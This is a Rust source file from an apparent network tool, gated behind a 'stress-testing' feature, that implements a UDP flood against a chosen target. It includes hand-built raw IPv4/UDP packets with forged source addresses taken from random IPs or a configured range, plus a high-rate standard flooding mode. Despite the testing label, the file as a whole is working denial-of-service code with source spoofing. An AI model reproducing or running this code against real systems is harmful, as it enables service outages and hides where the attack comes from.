#[cfg(feature = "stress-testing")]
use crate::error::{Result, SlapperError};
#[cfg(feature = "stress-testing")]
use rand::Rng;
#[cfg(feature = "stress-testing")]
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
#[cfg(feature = "stress-testing")]
use std::sync::Arc;
#[cfg(feature = "stress-testing")]
use std::time::{Duration, Instant};
#[cfg(feature = "stress-testing")]
use tokio::net::UdpSocket;

#[cfg(feature = "stress-testing")]
use super::metrics::StressMetrics;
#[cfg(feature = "stress-testing")]
use super::{StressConfig, StressStats};

#[cfg(all(feature = "stress-testing", unix))]
mod raw_udp {
    use std::net::Ipv4Addr;

    pub fn build_udp_packet(
        src_ip: Ipv4Addr,
        src_port: u16,
        dst_ip: Ipv4Addr,
        dst_port: u16,
        payload: &[u8],
    ) -> Vec<u8> {
        let udp_len = 8 + payload.len();
        let total_len = 20 + udp_len;

        let mut packet = vec![0u8; total_len];

        packet[0] = 0x45;
        packet[1] = 0;
        packet[2] = (total_len >> 8) as u8;
        packet[3] = (total_len & 0xff) as u8;
        packet[4] = 0;
        packet[5] = 0;
        packet[6] = 0x40;
        packet[7] = 0;
        packet[8] = 64;
        packet[9] = 17;

        packet[12..16].copy_from_slice(&src_ip.octets());
        packet[16..20].copy_from_slice(&dst_ip.octets());

        let checksum =
            calculate_udp_checksum(src_ip, dst_ip, src_port, dst_port, payload, udp_len as u16);

        packet[20 + 0] = (src_port >> 8) as u8;
        packet[20 + 1] = (src_port & 0xff) as u8;
        packet[20 + 2] = (dst_port >> 8) as u8;
        packet[20 + 3] = (dst_port & 0xff) as u8;
        packet[20 + 4] = (udp_len >> 8) as u8;
        packet[20 + 5] = (udp_len & 0xff) as u8;
        packet[20 + 6] = (checksum >> 8) as u8;
        packet[20 + 7] = (checksum & 0xff) as u8;

        packet[20 + 8..].copy_from_slice(payload);

        let ip_checksum = calculate_ip_checksum(&packet[..20]);
        packet[10] = (ip_checksum >> 8) as u8;
        packet[11] = (ip_checksum & 0xff) as u8;

        packet
    }

    fn calculate_ip_checksum(header: &[u8]) -> u16 {
        let mut sum: u32 = 0;
        for i in (0..header.len()).step_by(2) {
            let word = ((header[i] as u32) << 8) | (header[i + 1] as u32);
            sum += word;
        }
        while sum > 0xffff {
            sum = (sum & 0xffff) + (sum >> 16);
        }
        !sum as u16
    }

    fn calculate_udp_checksum(
        src_ip: Ipv4Addr,
        dst_ip: Ipv4Addr,
        src_port: u16,
        dst_port: u16,
        payload: &[u8],
        len: u16,
    ) -> u16 {
        let mut pseudo = vec![0u8; 12 + payload.len()];
        pseudo[0..4].copy_from_slice(&src_ip.octets());
        pseudo[4..8].copy_from_slice(&dst_ip.octets());
        pseudo[8] = 0;
        pseudo[9] = 17;
        pseudo[10] = (len >> 8) as u8;
        pseudo[11] = (len & 0xff) as u8;
        pseudo[12..14].copy_from_slice(&src_port.to_be_bytes());
        pseudo[14..16].copy_from_slice(&dst_port.to_be_bytes());
        pseudo[16..].copy_from_slice(payload);

        let mut sum: u32 = 0;
        for i in (0..pseudo.len()).step_by(2) {
            if i + 1 < pseudo.len() {
                let word = ((pseudo[i] as u32) << 8) | (pseudo[i + 1] as u32);
                sum += word;
            } else {
                sum += (pseudo[i] as u32) << 8;
            }
        }
        while sum > 0xffff {
            sum = (sum & 0xffff) + (sum >> 16);
        }
        !sum as u16
    }
}

#[cfg(feature = "stress-testing")]
pub async fn run_udp_flood(
    config: &StressConfig,
    metrics: Arc<StressMetrics>,
) -> Result<StressStats> {
    let target_ip = resolve_target(&config.target).await?;
    let target_addr = SocketAddr::new(target_ip, config.port);

    let payload = generate_payload(config.payload_size);

    metrics.start();

    if config.spoof_source {
        #[cfg(all(feature = "stress-testing", unix))]
        {
            return run_udp_flood_spoofed(config, target_addr, payload, metrics).await;
        }

        #[cfg(not(all(feature = "stress-testing", unix)))]
        {
            tracing::warn!("IP spoofing requires Unix and raw socket support");
            return Err(SlapperError::Runtime(
                "IP spoofing not supported on this platform".to_string(),
            ));
        }
    }

    run_udp_flood_standard(config, target_addr, payload, (&*metrics).clone()).await
}

#[cfg(all(feature = "stress-testing", unix))]
async fn run_udp_flood_spoofed(
    config: &StressConfig,
    target_addr: SocketAddr,
    payload: Vec<u8>,
    metrics: Arc<StressMetrics>,
) -> Result<StressStats> {
    use raw_udp::build_udp_packet;
    use std::net::Ipv4Addr;

    let target_ip_v4 = match target_addr.ip() {
        IpAddr::V4(ip) => ip,
        IpAddr::V6(_) => {
            return Err(SlapperError::Runtime(
                "IPv6 not supported for spoofed UDP".to_string(),
            ));
        }
    };

    let src_ips: Vec<Ipv4Addr> = if let Some(ref range) = config.spoof_range {
        parse_spoof_range(range)?
    } else {
        vec![generate_random_ip()]
    };

    let duration = Duration::from_secs(config.duration_secs);
    let start_time = Instant::now();
    let interval = Duration::from_micros(1_000_000 / config.rate_pps.max(1));

    crate::utils::privilege::check_privileged("UDP flood")?;

    let socket = unsafe {
        let sock = libc::socket(libc::PF_INET, libc::SOCK_RAW, libc::IPPROTO_RAW);
        if sock < 0 {
            return Err(SlapperError::Runtime(format!(
                "Failed to create raw socket: {}",
                std::io::Error::last_os_error()
            )));
        }

        let one: libc::c_int = 1;
        if libc::setsockopt(
            sock,
            libc::IPPROTO_IP,
            libc::IP_HDRINCL,
            &one as *const _ as *const libc::c_void,
            std::mem::size_of::<libc::c_int>() as libc::socklen_t,
        ) < 0
        {
            libc::close(sock);
            return Err(SlapperError::Runtime(format!(
                "Failed to set IP_HDRINCL: {}",
                std::io::Error::last_os_error()
            )));
        }

        std::sync::Mutex::new(sock)
    };

    let socket = Arc::new(socket);
    let src_ips = Arc::new(src_ips);
    let metrics = Arc::new(metrics);

    let mut handles = Vec::new();

    while start_time.elapsed() < duration {
        let src_ip = src_ips[rand::random::<usize>() % src_ips.len()];
        let src_port = if config.random_source_port {
            rand::random::<u16>()
        } else {
            0
        };

        let packet = build_udp_packet(src_ip, src_port, target_ip_v4, target_addr.port(), &payload);

        let socket = socket.clone();
        let metrics = metrics.clone();

        let handle = tokio::spawn(async move {
            let mut dst: libc::sockaddr_in = unsafe { std::mem::zeroed() };
            #[cfg(any(
                target_os = "macos",
                target_os = "ios",
                target_os = "freebsd",
                target_os = "netbsd",
                target_os = "openbsd",
                target_os = "dragonfly"
            ))]
            {
                dst.sin_len = std::mem::size_of::<libc::sockaddr_in>() as u8;
            }
            dst.sin_family = libc::AF_INET as _;
            dst.sin_port = target_addr.port().to_be();
            dst.sin_addr = libc::in_addr {
                s_addr: u32::from_be_bytes(target_ip_v4.octets()),
            };

            let result = unsafe {
                let sock = match socket.lock() {
                    Ok(guard) => *guard,
                    Err(poisoned) => *poisoned.into_inner(),
                };
                libc::sendto(
                    sock,
                    packet.as_ptr() as *const libc::c_void,
                    packet.len(),
                    0,
                    &dst as *const _ as *const libc::sockaddr,
                    std::mem::size_of::<libc::sockaddr_in>() as libc::socklen_t,
                )
            };

            if result >= 0 {
                metrics.record_packet(packet.len() as u64);
            } else {
                metrics.record_error();
            }
        });

        handles.push(handle);

        if interval > Duration::ZERO {
            tokio::time::sleep(interval).await;
        }
    }

    futures::future::join_all(handles).await;

    if let Ok(guard) = socket.lock() {
        unsafe { libc::close(*guard) };
    }

    Ok(metrics.to_stats())
}

fn parse_spoof_range(range: &str) -> Result<Vec<Ipv4Addr>> {
    let mut ips = Vec::new();
    let parts: Vec<&str> = range.split('-').collect();

    if parts.len() == 2 {
        let start: u32 = parts[0]
            .parse()
            .map_err(|_| SlapperError::Runtime("Invalid start IP".to_string()))?;
        let end: u32 = parts[1]
            .parse()
            .map_err(|_| SlapperError::Runtime("Invalid end IP".to_string()))?;

        for ip in start..=end {
            ips.push(Ipv4Addr::from(ip));
        }
    } else if parts.len() == 1 {
        let cidr: ipnetwork::Ipv4Network = range
            .parse()
            .map_err(|_| SlapperError::Runtime("Invalid CIDR".to_string()))?;

        for ip in cidr.iter() {
            ips.push(ip);
        }
    }

    Ok(ips)
}

fn generate_random_ip() -> Ipv4Addr {
    let mut rng = rand::thread_rng();
    Ipv4Addr::new(
        rng.gen_range(1..254),
        rng.gen_range(0..255),
        rng.gen_range(0..255),
        rng.gen_range(1..254),
    )
}

#[cfg(feature = "stress-testing")]
async fn run_udp_flood_standard(
    config: &StressConfig,
    target_addr: SocketAddr,
    payload: Vec<u8>,
    metrics: StressMetrics,
) -> Result<StressStats> {
    let start_time = Instant::now();
    let duration = Duration::from_secs(config.duration_secs);
    let interval = Duration::from_micros(1_000_000 / config.rate_pps.max(1));

    let semaphore = Arc::new(tokio::sync::Semaphore::new(config.concurrency));
    let metrics = Arc::new(metrics.clone());
    let payload = Arc::new(payload);
    let target_addr = Arc::new(target_addr);
    let random_port = config.random_source_port;

    let mut handles = Vec::new();

    while start_time.elapsed() < duration {
        let permit = semaphore.clone().acquire_owned().await?;
        let target = *target_addr;
        let payload = payload.clone();
        let metrics = metrics.clone();

        let port = if random_port {
            Some(rand::random::<u16>())
        } else {
            None
        };

        let handle = tokio::spawn(async move {
            let socket = match create_udp_socket(port).await {
                Ok(s) => s,
                Err(_) => {
                    metrics.record_error();
                    drop(permit);
                    return;
                }
            };

            match socket.send_to(&payload, target).await {
                Ok(_) => {
                    metrics.record_packet(payload.len() as u64);
                }
                Err(_) => {
                    metrics.record_error();
                }
            }

            drop(permit);
        });

        handles.push(handle);

        if interval > Duration::ZERO {
            tokio::time::sleep(interval).await;
        }
    }

    futures::future::join_all(handles).await;

    Ok(metrics.to_stats())
}

#[cfg(feature = "stress-testing")]
async fn resolve_target(target: &str) -> Result<IpAddr> {
    if let Ok(ip) = target.parse::<IpAddr>() {
        return Ok(ip);
    }

    let addrs: Vec<_> = tokio::net::lookup_host((target, 0)).await?.collect();

    addrs
        .first()
        .map(|a| a.ip())
        .ok_or_else(|| SlapperError::Runtime(format!("Failed to resolve target: {}", target)))
}

#[cfg(feature = "stress-testing")]
async fn create_udp_socket(port: Option<u16>) -> Result<UdpSocket> {
    let socket = if let Some(port) = port {
        UdpSocket::bind(format!("0.0.0.0:{}", port)).await?
    } else {
        UdpSocket::bind("0.0.0.0:0").await?
    };

    socket.set_broadcast(true)?;

    Ok(socket)
}

#[cfg(feature = "stress-testing")]
fn generate_payload(size: usize) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let mut payload = vec![0u8; size];
    rng.fill(&mut payload[..]);
    payload
}

#[cfg(not(feature = "stress-testing"))]
pub async fn run_udp_flood(
    _config: &super::StressConfig,
    _metrics: &super::metrics::StressMetrics,
) -> crate::error::Result<super::StressStats> {
    Err(SlapperError::Runtime(
        "UDP flood requires 'stress-testing' feature enabled".to_string(),
    ))
}
